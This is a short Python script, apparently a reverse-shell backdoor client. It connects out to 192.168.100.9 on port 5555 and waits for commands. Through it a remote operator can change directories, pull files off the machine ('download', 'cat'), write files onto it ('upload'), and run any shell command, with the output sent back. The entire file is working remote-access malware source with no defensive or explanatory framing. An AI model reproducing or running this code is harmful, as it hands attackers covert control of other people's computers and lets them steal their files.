import socket
import subprocess
import os

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

socket.connect(('192.168.100.9', 5555))

while True:

    data = socket.recv(2048).decode('ascii')

    if data[0:2] == 'cd':

        try:

            os.chdir(data[3:])

            socket.send(f'You are in {data[3:]}'.encode('ascii'))

            continue

        except FileNotFoundError:

            socket.send(f'{data[3:]} Not Detected.'.encode('ascii'))

            continue

        except OSError:
            continue

    elif data[0:8] == 'download':
        
        try:

            with open(data[9:], 'rb') as file:

                file = file.read()

                socket.send(file)

                continue

        except FileNotFoundError:

            socket.send('File Not Found'.encode('ascii'))

            continue

    elif data[0:6] == 'upload':

        socket.send('File Required'.encode('ascii'))

        file_data = socket.recv(2048).decode('ascii')

        file = open(data[7:], 'wb')

        file = file.write(file_data.encode('ascii'))

        continue

    elif data[0:3] =='cat':

        try:

            with open(data[4:], 'rb') as f:

                file = f.read()

                socket.send(file)

                continue

        except:

            socket.send('File Not Found (ERROR)'.encode('ascii'))

            continue
    
    elif data == 'exit':

        subprocess.check_output('exit')
        
        exit()

    else:

        try:

            out = subprocess.check_output(data, shell=True).decode('ascii')

            if out == '':
                
                socket.send('Command Excuted!'.encode('ascii'))
            
            else:

                socket.send(out.encode('ascii'))

            continue

        except subprocess.CalledProcessError:

            socket.send('Error!'.encode('ascii'))

            continue
